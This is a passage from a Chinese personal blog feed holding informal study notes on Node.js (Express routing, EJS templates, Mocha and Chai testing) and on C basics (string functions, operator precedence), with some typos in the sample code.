class="line"><span class="number">1.</span>路由中间件</span><br><span class="line"><span class="number">2.</span>自定义中间件（app.set(<span class="string">'port'</span>, port)这样）</span><br><span class="line"></span><br><span class="line">app.use()</span><br></pre></td></tr></table></figure><p><code>app.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));   <span class="comment">//设置静态文件路径</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> usersRouter = <span class="built_in">require</span>(<span class="string">'./routes/users'</span>);</span><br><span class="line">app.use(<span class="string">'/users'</span>, usersRouter);</span><br></pre></td></tr></table></figure><p><code>router/xxx.js</code> 路由的中间件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> //这里的index就是view下面的index.jade</span><br><span class="line">res.render(&apos;index&apos;, &#123; title: &apos;Express&apos; &#125;);  //渲染模板 ， index不用写后缀名</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#比如 index.js</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">// get('/', xxx) 因为前面写了/user，所以这里只写/即可</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123; </span><br><span class="line">  res.send(<span class="string">'respond with a resource'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;  <span class="comment">// 暴露出去，才能以中间件的形式存在</span></span><br></pre></td></tr></table></figure><p><code>views/xxx.jade</code> 模板文件</p><h4 id="3-Express中的路由"><a href="#3-Express中的路由" class="headerlink" title="3). Express中的路由"></a>3). Express中的路由</h4><p>users.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'respond with a resource'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二层路由，第一层在app.js里</span></span><br><span class="line">router.get(<span class="string">'/list'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'user list'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以写成表达式（正则）</span></span><br><span class="line">router.get(<span class="string">'/a*d'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'表达式路由'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//转到一个文件</span></span><br><span class="line">router.get(<span class="string">'/form'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendFile(__dirname + <span class="string">'/form.html'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//post请求</span></span><br><span class="line">router.post(<span class="string">'/save'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">"表单提交!"</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// all， post和get都接收</span></span><br><span class="line">router.all(<span class="string">'/all'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">"post和get都接收!"</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>form.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/users/save"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"formClass"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line">        username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-Express中的模板"><a href="#4-Express中的模板" class="headerlink" title="4). Express中的模板"></a>4). Express中的模板</h4><p>ejs/jade等</p><p>ejs比较简单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#安装（express内置了ejs）</span><br><span class="line">npm install ejs --save</span><br><span class="line"></span><br><span class="line">#配置ejs模板引擎</span><br><span class="line">app.set(<span class="string">'view engine'</span>,<span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">#渲染页面</span><br><span class="line">render(filename,json)接收两个参数。</span><br><span class="line"></span><br><span class="line">#如下</span><br><span class="line">app.get(<span class="string">'/learnejs'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">let</span> arr=[<span class="string">'吃饭'</span>,<span class="string">'睡觉'</span>,<span class="string">'打豆豆'</span>]</span><br><span class="line">    res.render(<span class="string">'index'</span>,&#123;</span><br><span class="line">        list_a:arr</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#index.ejs</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;%<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;list_a.length;i++)&#123;%&gt;</span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">%=list[i]%</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;%&#125;%&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br></pre></td></tr></table></figure><p>渲染页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">render(filename,json)接收两个参数。</span><br></pre></td></tr></table></figure><p>常用标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  %&gt;   流程控制标签</span><br><span class="line">&lt;%= %&gt; 输出标签（原文输出html标签）</span><br><span class="line">&lt;%- %&gt; 输出标签（html会被浏览器解析）</span><br><span class="line">&lt;%# %&gt; 注释标签</span><br><span class="line">% 对标记进行转义</span><br></pre></td></tr></table></figure><p><code>includes</code>,在一个模板里面引用另一个模板</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- include(<span class="string">"模板路径"</span>, &#123;<span class="attr">user</span>:<span class="string">"传递的参数内容"</span>&#125;)  %&gt;</span><br></pre></td></tr></table></figure><h2 id="九-mocha"><a href="#九-mocha" class="headerlink" title="九.mocha"></a>九.mocha</h2><blockquote><p>前端测试框架</p></blockquote><p>浏览器和Node环境都可使用</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 安装</span><br><span class="line">npm install mocha -g</span><br><span class="line"></span><br><span class="line">#命令</span><br><span class="line">mocha</span><br><span class="line"></span><br><span class="line">#本地安装</span><br><span class="line">npm install mocha -D</span><br><span class="line"></span><br><span class="line"># 修改配置文件中test命令</span><br><span class="line">&quot;test&quot;: &quot;......./bin/mocha&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 运行</span><br><span class="line">npm test</span><br></pre></td></tr></table></figure><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p><strong>定义测试：</strong></p><p>创建一个js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">describe(<span class="string">"Demo"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    describe(<span class="string">"方法1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        before(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//测试之前做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---测试之前做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        after(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//测试之后做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---测试之前后做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">       beforeEach(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;  <span class="comment">//每条测试之前做的内容</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"---每条测试之前做的内容"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        context(<span class="string">"情景1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">            it(<span class="string">"测试1"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;)</span><br><span class="line">            it(<span class="string">"测试2"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>mocha</code> 来启动测试/ 或使用本地安装的mocha来测试<code>npm test</code></p><h4 id="assert断言"><a href="#assert断言" class="headerlink" title="assert断言"></a>assert断言</h4><p>使用库：<code>chai</code></p><ul><li>chai: 断言库</li><li>chai: should分割的断言</li><li>chai：expect风格的断言</li></ul><p>安装到本地：<code>npm install  chai -D</code></p><p><strong>使用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> assert = chai.assert</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  it(<span class="string">"使用 assert风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    assert.typeOf(val, <span class="string">'string'</span>)</span><br><span class="line">    assert.equal(<span class="string">'hello'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> sholud = chai.sholud</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, () =&gt; &#123;</span><br><span class="line">  it(<span class="string">"使用 sholud风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    val.sholud.exist</span><br><span class="line">    val.sholud.be.a(<span class="string">'string'</span>)</span><br><span class="line">    val.sholud.equal(<span class="string">'hello'</span>)</span><br><span class="line">    val.sholud.not.equal(<span class="string">'hello'</span>)</span><br><span class="line">    val.sholud.have.length()</span><br><span class="line">    <span class="comment">//多个条件逻辑与</span></span><br><span class="line">    val.sholud.equal(<span class="string">'hello'</span>).and.exist.and.be.a(<span class="string">'string'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> chai = <span class="built_in">require</span>(<span class="string">'chai'</span>)</span><br><span class="line"><span class="keyword">const</span> expect = chai.expect</span><br><span class="line"></span><br><span class="line">describe(<span class="string">'Demo'</span>, () =&gt; &#123;</span><br><span class="line">  it(<span class="string">"使用 expect风格的断言测试"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">'hello'</span></span><br><span class="line">    <span class="keyword">var</span> number = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    expext(number).to.be.at.most(<span class="number">5</span>)</span><br><span class="line">    expext(number).to.be.at.least(<span class="number">3</span>)</span><br><span class="line">    expext(number).to.be.at.within(<span class="number">1</span>,<span class="number">8</span>)</span><br><span class="line">      </span><br><span class="line">    expect(value).to.exist</span><br><span class="line">    expect(value).to.be.a(<span class="string">'string'</span>)</span><br><span class="line">    expect(value).to.equal(<span class="string">'hello'</span>)</span><br><span class="line">    expect(value).to.not.equal(<span class="string">'hello'</span>)</span><br><span class="line">    expect(value).to.have.length(<span class="number">5</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="运行多个测试"><a href="#运行多个测试" class="headerlink" title="运行多个测试"></a>运行多个测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mocha --recursive   <span class="comment"># 递归</span></span><br></pre></td></tr></table></figure><p>好了，再学就跑偏了…… :smile:</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Node.js是一个机遇Chrome V8引擎的JavaScript运行环境&lt;/p&gt;
&lt;p&gt;Node.js的包管理器npm，是全球最大的开源生态库系统&lt;/p&gt;
&lt;p&gt;Node.js可解析js代码，没有浏览器安全级别的限制&lt;/p&gt;
&lt;h2 id=&quot;一-开发环境配置&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="Node.js" scheme="http://www.xpshuai.cn/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://www.xpshuai.cn/tags/Node-js/"/>
    
      <category term="编程" scheme="http://www.xpshuai.cn/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>C语言琐碎复习（内容简单,仅自己看）</title>
    <link href="http://www.xpshuai.cn/C%E8%AF%AD%E8%A8%80%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%86%85%E5%AE%B9%E7%AE%80%E5%8D%95-%E4%BB%85%E8%87%AA%E5%B7%B1%E7%9C%8B%EF%BC%89/"/>
    <id>http://www.xpshuai.cn/C语言琐碎复习（内容简单-仅自己看）/</id>
    <published>2020-03-26T04:26:22.000Z</published>
    <updated>2020-04-27T10:57:02.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于好久时间不看C了，好多东西都忘了</p><p>本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈</p></blockquote><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> greeting[<span class="number">6</span>] = &#123;<span class="string">'H'</span>, <span class="string">'e'</span>, <span class="string">'l'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'\0'</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1strcpy(s1, s2);</span></span><br><span class="line">复制字符串 s2 到字符串 s1。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//2strcat(s1, s2);</span></span><br><span class="line">连接字符串 s2 到字符串 s1 的末尾。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//3strlen(s1);</span></span><br><span class="line">返回字符串 s1 的长度。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//4strcmp(s1, s2);</span></span><br><span class="line">如果 s1 和 s2 是相同的，则返回 <span class="number">0</span>；如果 s1&lt;s2 则返回小于 <span class="number">0</span>；如果 s1&gt;s2 则返回大于 <span class="number">0</span>。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//5strchr(s1, ch);</span></span><br><span class="line">返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</span><br><span class="line">    </span><br><span class="line"><span class="comment">//6strstr(s1, s2);</span></span><br><span class="line">返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="comment">//strlen 与 sizeof的区别：</span></span><br><span class="line"><span class="built_in">strlen</span> 是函数</span><br><span class="line"><span class="keyword">sizeof</span> 是运算操作符</span><br><span class="line">二者得到的结果类型为 <span class="keyword">size_t</span>，即 <span class="keyword">unsigned</span> <span class="keyword">int</span> 类型。</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span> 计算的是变量的大小，不受字符 \<span class="number">0</span> 影响；</span><br><span class="line"><span class="built_in">strlen</span> 计算的是字符串的长度，以 \<span class="number">0</span> 作为长度判定依据。</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line"><span class="comment">// 'a' 表示是一个字符，"a" 表示一个字符串相当于 'a'+'\0';</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//字符串遍历</span></span><br><span class="line"><span class="keyword">char</span> hi[] = <span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">for</span>(i==<span class="number">0</span>, i&lt;<span class="number">6</span>,i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>,hi[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj"><a href="#运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj" class="headerlink" title="运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj"></a>运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj</h4><table><thead><tr><th><strong>优先级</strong></th><th><strong>运算符</strong></th><th><strong>名称或含义</strong></th><th><strong>使用形式</strong></th><th><strong>结合方向</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td>[]</td><td>数组下标</td><td>数组名[常量表达式]</td><td>左到右</td><td></td></tr><tr><td>()</td><td>圆括号</td><td>（表达式）/函数名(形参表)</td><td></td><td></td><td></td></tr><tr><td>.</td><td>成员选择（对象）</td><td>对象.成员名</td><td></td><td></td><td></td></tr><tr><td>-&gt;</td><td>成员选择（指针）</td><td>对象指针-&gt;成员名</td><td></td><td></td><td></td></tr><tr><td><strong>2</strong></td><td>-</td><td>负号运算符</td><td>-表达式</td><td><strong>右到左</strong></td><td>单目运算符</td></tr><tr><td>(类型)</td><td>强制类型转换</td><td>(数据类型)表达式</td><td></td><td></td><td></td></tr><tr><td>++</td><td>自增运算符</td><td>++变量名/变量名++</td><td>单目运算符</td><td></td><td></td></tr><tr><td>–</td><td>自减运算符</td><td>–变量名/变量名–</td><td>单目运算符</td><td></td><td></td></tr><tr><td>*</td><td>取值运算符</td><td>*指针变量</td><td>单目运算符</td><td></td><td></td></tr><tr><td>&amp;</td><td>取地址运算符</td><td>&amp;变量名</td><td>单目运算符</td><td></td><td></td></tr><tr><td>!</td><td>逻辑非运算符</td><td>!表达式</td><td>单目运算符</td><td></td><td></td></tr><tr><td>~</td><td>按位取反运算符</td><td>~表达式</td><td>单目运算符</td><td></td><td></td></tr><tr><td>sizeof</td><td>长度运算符</td><td>sizeof(表达式)</td><td></td><td></td><td></td></tr><tr><td><strong>3</strong></td><td>/</td><td>除</td><td>表达式/表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>*</td><td>乘</td><td>表达式*表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>%</td><td>余数（取模）</td><td>整型表达式/整型表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>4</strong></td><td>+</td><td>加</td><td>表达式+表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>-</td><td>减</td><td>表达式-表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>5</strong></td><td>&lt;&lt;</td><td>左移</td><td>变量&lt;&lt;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>&gt;&gt;</td><td>右移</td><td>变量&gt;&gt;表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>6</strong></td><td>&gt;</td><td>大于</td><td>表达式&gt;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>表达式&gt;=表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>&lt;</td><td>小于</td><td>表达式&lt;表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td>&lt;=</td><td>小于等于</td><td>表达式&lt;=表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>7</strong></td><td>==</td><td>等于</td><td>表达式==表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td>!=</td><td>不等于</td><td>表达式!= 表达式</td><td>双目运算符</td><td></td><td></td></tr><tr><td><strong>8</strong></td><td>&amp;</td><td>按位与</td><td>表达式&amp;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>9</strong></td><td>^</td><td>按位异或</td><td>表达式^表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>10</strong></td><td>\</td><td></td><td>按位或</td><td>表达式\</td><td>表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>11</strong></td><td>&amp;&amp;</td><td>逻辑与</td><td>表达式&amp;&amp;表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>12</strong></td><td>\</td><td>\</td><td></td><td>逻辑或</td><td>表达式\</td><td>\</td><td>表达式</td><td>左到右</td><td>双目运算符</td></tr><tr><td><strong>13</strong></td><td>?:</td><td>条件运算符</td><td>表达式1? 表达式2: 表达式3</td><td>右到左</td><td>三目运算符</td></tr><tr><td><strong>14</strong></td><td>=</td><td>赋值运算符</td><td>变量=表达式</td><td><strong>右到左</strong></td><td></td></tr><tr><td>/=</td><td>除后赋值</td><td>变量/=表达式</td><td></td><td></td><td></td></tr><tr><td>*=</td><td>乘后赋值</td><td>变量*=表达式</td><td></td><td></td><td></td></tr><tr><td>%=</td><td>取模后赋值</td><td>变量%=表达式</td><td></td><td></td><td></td></tr><tr><td>+=</td><td>加后赋值</td><td>变量+=表达式</td><td></td><td></td><td></td></tr><tr><td>-=</td><td>减后赋值</td><td>变量-=表达式</td><td></td><td></td><td></td></tr><tr><td>&lt;&lt;=</td><td>左移后赋值</td><td>变量&lt;&lt;=表达式</td><td></td><td></td><td></td></tr><tr><td>&gt;&gt;=</td><td>右移后赋值</td><td>变量&gt;&gt;=表达式</td><td></td><td></td><td></td></tr><tr><td>&amp;=</td><td>按位与后赋值</td><td>变量&amp;=表达式</td><td></td><td></td><td></td></tr><tr><td>^=</td><td>按位异或后赋值</td><td>变量^=表达式</td><td></td><td></td><td></td></tr><tr><td>\</td><td>=</td><td>按位或后赋值</td><td>变量\</td><td>=表达式</td><td></td><td></td><td></td></tr><tr><td><strong>15</strong></td><td>,</td><td>逗号运算符</td><td>表达式,表达式,…</td><td>左到右</td><td>从左向右顺序运算</td></tr></tbody></table><blockquote><p>注：同一优先级的运算符，运算次序由结合方向所决定。</p></blockquote><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 